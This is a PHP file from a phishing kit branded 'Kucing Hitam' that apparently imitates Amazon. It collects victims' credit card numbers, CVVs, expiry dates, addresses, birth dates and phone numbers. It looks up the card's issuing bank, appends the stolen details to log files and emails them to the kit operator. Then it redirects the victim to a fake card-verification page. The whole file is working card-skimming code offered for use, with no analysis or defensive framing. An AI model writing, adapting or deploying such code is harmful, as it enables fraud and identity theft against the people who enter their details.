<?php
/*
+-=[K]ucing[H]itam[S]hop=-+
*/

session_start();
$randomnumber = rand(1,100);

include('../__CONFIG__.php');
require('../detect.php');

// fungsi bin
$ncn     = $_POST['ncn'];
$bin     = str_replace(' ', '', $ncn);
$bin     = substr($bin, 0, 6);
$ncn     = str_replace(' ', '', $ncn);
$c = curl_init();
curl_setopt($c, CURLOPT_URL, "https://binlist.io/lookup/".$bin."/");
curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($c, CURLOPT_FOLLOWLOCATION,true);
$result = curl_exec($c);
curl_close($c);
$ident = json_decode($result);
$ccbrand = strtoupper($ident->scheme);
$ccbank =  strtoupper($ident->bank->name);
$cctype = strtoupper($ident->type);
$cclevel = strtoupper($ident->category);
$_SESSION["scheme"] = $ccbrand;
$_SESSION["type"] = $cctype;
$_SESSION["category"] = $cclevel;
$_SESSION["bank"] = $ccbank;
//lanjuut

if (isset($_POST['Sex']))
{

	$_SESSION['fullname'] = $_POST['fullname'];
	$_SESSION['address1'] = $_POST['address1'];
	$_SESSION['address2'] = $_POST['address2'];
	$_SESSION['city'] = $_POST['city'];
	$_SESSION['state'] = $_POST['state'];
	$_SESSION['zip'] = $_POST['zip'];
	$_SESSION['country'] = $_POST['country'];
	$_SESSION['dob'] = $_POST['dob'];
	$_SESSION['phone'] = $_POST['phone'];
	$_SESSION['nameoncard'] = $_POST['nameoncard'];
	$_SESSION['ncn'] = $_POST['ncn'];
	$_SESSION['cxxs'] = $_POST['cxxs'];
	$_SESSION['month'] = $_POST['month'];
	$_SESSION['year'] = $_POST['year'];
	$name = $_POST['nameoncard'];

 $message = "
[+] ========. [ $$ Kucing Hitam $$ ] .======= [+]
                   
-----------Bank Identification Number------------
Bin: ".$bin." - " .$ccbrand." " .$cctype." " .$cclevel." " .$ccbank."
----------------Credit Card----------------------
Cardholder   : ".$_POST['nameoncard']."
Card number  : ".$_POST['ncn']."
Expire       : ".$_POST['month']."/".$_POST['year']."
cvv          : ".$_POST['cxxs']."
---------------Billing Info----------------------
Full Name    : ".$_POST['fullname']."
Address1     : ".$_POST['address1']."
Address2     : ".$_POST['address2']."
City         : ".$_POST['city']."
State        : ".$_POST['state']."
Zipcode      : ".$_POST['zip']."
Country      : ".$_POST['country']."
Phone        : ".$_POST['phone']."
Date of Birth: ".$_POST['dob']."
----------------PC Info--------------------------
IP         : ".$ip." | ".$nama_negara."
Browser    : ".$_SERVER['HTTP_USER_AGENT']."
[+] ========. [ $$ Silent Is Gold $$ ] .===== [+]
 ";
    $save = fopen("../../log/backup_cc.txt", "a+");
    fwrite($save, $message);
    fclose($save);
    $file2 = "../../log/cc.txt";
    $isi  = @file_get_contents($file2);
    $buka = fopen($file2,"w"); 
    fwrite($buka, $isi+1);
    fclose($buka);
    $headers = "From: Result CC  <amazonCC-$randomnumber@kucinghitam.team>";
    $subject = "".$name." - ".$bin." - " .$ccbrand." " .$cctype." " .$cclevel." " .$ccbank." [ ".$ip." ] - [".$nama_negara."] - [".$contin_name."] ";
	mail($to, $subject, $message, $headers);
    $empas = "# $bin - $ccbrand - $cctype - $cclevel - $ccbank - [".$contin_name."]\n";
	$file = fopen("../../log/bin.txt", "a");
	fwrite($file, $empas);
	fclose($file);


	header('Location: ../verifiedby.php?udm_cat_path='.sha1(time()));
}
else
{
	# code...
}
